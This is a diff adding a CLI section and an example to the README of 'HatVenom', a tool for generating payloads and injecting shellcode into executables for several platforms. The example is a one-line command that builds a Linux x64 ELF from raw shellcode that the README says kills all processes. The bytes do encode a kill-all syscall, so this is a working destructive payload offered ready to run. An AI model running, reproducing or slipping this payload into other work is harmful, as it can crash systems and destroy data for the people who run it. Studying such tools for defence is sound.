@@ -96,3 +96,32 @@ shellcode = (
 hatvenom = HatVenom()
 hatvenom.generate_to('macho', 'x64', shellcode, {'file':'//usr/bin/whoami'})
 ```
+
+## HatVenom CLI
+
+HatVenom also has their own command line interface that can be invoked by executing `hatvenom.py`:
+
+```shell
+usage: hatvenom.py [-h] [--format FORMAT] [--arch ARCH] [--shellcode SHELLCODE] [--offsets OFFSETS] [-o OUTPUT] [-l]
+
+Powerful payload generation and shellcode injection tool that provides support for common platforms and architectures.
+
+optional arguments:
+  -h, --help            show this help message and exit
+  --format FORMAT       Platform to generate for.
+  --arch ARCH           Architecture to generate for.
+  --shellcode SHELLCODE
+                        Shellcode to inject.
+  --offsets OFFSETS     Shellcode offsets.
+  -o OUTPUT, --output OUTPUT
+                        File to output generated payload.
+  -l, --list            List all formats and platforms.
+```
+
+## Examples
+
+Let's generate simple payload that kills all processes for Linux and save it to `a.out`.
+
+```shell
+python3 hatvenom.py --format elf --arch x64 --shellcode "\x6a\x3e\x58\x6a\xff\x5f\x6a\x09\x5e\x0f\x05"
+```
